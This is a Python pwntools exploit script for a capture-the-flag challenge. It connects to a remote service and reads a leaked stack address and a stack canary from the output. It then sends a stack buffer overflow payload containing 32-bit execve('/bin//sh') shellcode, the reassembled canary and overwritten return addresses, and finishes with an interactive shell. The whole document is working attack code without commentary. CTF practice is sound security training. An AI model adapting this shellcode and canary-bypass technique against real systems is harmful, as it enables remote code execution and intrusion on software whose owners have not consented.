from pwn import *

host, port = "chal.utc-ctf.club", 4902
r = remote(host, port)
r.recvuntil("Legend:")
res = r.recv(170)

log.info("%s" % res)
res = r.recv(10)
ret = int(res, 16)
log.info("address = %#x" % ret)
res = r.recv(833)
log.info(res)
canary =r.recv(2)
log.info(r.recv(11))

res = r.recv(2)
canary = res + canary
res = r.recv(11)
res = r.recv(2)
canary = res + canary
res = r.recv(11)
res = r.recv(2)
canary = "0x" + res + canary
canary = int(canary,16)
log.info("canary = %#x" %canary)

shellcode = "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80"
buf = shellcode
buf += 'a'*23
buf += p32(canary)
buf += "\x00\xa0\x04\x08"
buf += p32(ret + 72)
buf += p32(ret)
r.sendline(buf)

r.interactive()